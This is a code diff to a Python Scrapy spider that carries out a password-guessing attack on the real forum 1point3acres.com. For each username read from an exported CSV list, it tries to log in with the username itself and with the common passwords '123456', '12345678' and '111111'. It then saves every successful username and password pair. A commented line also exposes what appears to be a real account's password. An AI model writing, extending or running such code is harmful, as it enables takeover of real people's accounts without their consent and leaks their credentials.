@@ -100,40 +100,50 @@ class LoginSpider(Spider):
     name="1point3acres.login"
     start_urls=["http://1point3acres.com/bbs"]
     def __init__(self):
-        reader=csv.reader(file(r'D:\PythonWorkspace\PythonCrawler\pointacre\usernames.csv','rb'))
         self.usernames=[]
+        reader=csv.reader(file(r'D:\PythonWorkspace\PythonCrawler\pointacre\export.csv','rb'))
         for line in reader:
-            self.usernames.append(line[0])
+            self.usernames.append(line[0].decode('gbk'))
     def parse(self, response):
         request_url="http://1point3acres.com/bbs/member.php?mod=logging&action=login&loginsubmit=yes&infloat=yes&lssubmit=yes&inajax=1"
         request=[]
         for username in self.usernames:
-            print "Username:%s" % username
             data={}
             data['username']=username
             data['password']=username
-            r=FormRequest(url=request_url,formdata=data,callback=self.after_login)
+            r=FormRequest(url=request_url,formdata=data,callback=self.after_login,meta=data)
             request.append(r)
             data={}
             data['username']=username
             data['password']="123456"
-            r=FormRequest(url=request_url,formdata=data,callback=self.after_login)
+            r=FormRequest(url=request_url,formdata=data,callback=self.after_login,meta=data)
             request.append(r)
-        # r=FormRequest(url=request_url,formdata={'username':'zym242','password':'zym242'},callback=self.after_login)
+            data={}
+            data['username']=username
+            data['password']="12345678"
+            r=FormRequest(url=request_url,formdata=data,callback=self.after_login,meta=data)
+            request.append(r)
+            data={}
+            data['username']=username
+            data['password']="111111"
+            r=FormRequest(url=request_url,formdata=data,callback=self.after_login,meta=data)
+            request.append(r)
+        # r=FormRequest(url=request_url,formdata={'username':'zym242','password':'zym090541'},callback=self.after_login,meta={'username':'zym242'})
         # request.append(r)
         return request
 
     def after_login(self,response):
         # check login succeed before going on
         message=response.body
+        username=response.meta['username']
+        password=response.meta['password']
         if re.search(u"登录失败".encode('gbk'),message):
-            print "%s" % "failed"
+            print "%s:%s" % (username,"failed")
         elif re.search(u"密码错误".encode('gbk'),message):
             print "%s" % "too many times"
         else:
-            print "%s" % "*********succeed*********"
-            username=re.search(ur"'username':'(\w+)'",message,re.I).group(1)
-            print "Username:%s" % username
-            item=LoginItem()
-            item['username']=username
-            return item
+            print "%s:%s" % (username,"=======success==========")
+            loader=UserLoader(LoginItem())
+            loader.add_value('username',username)
+            loader.add_value('password',password)
+            return loader.load_item()
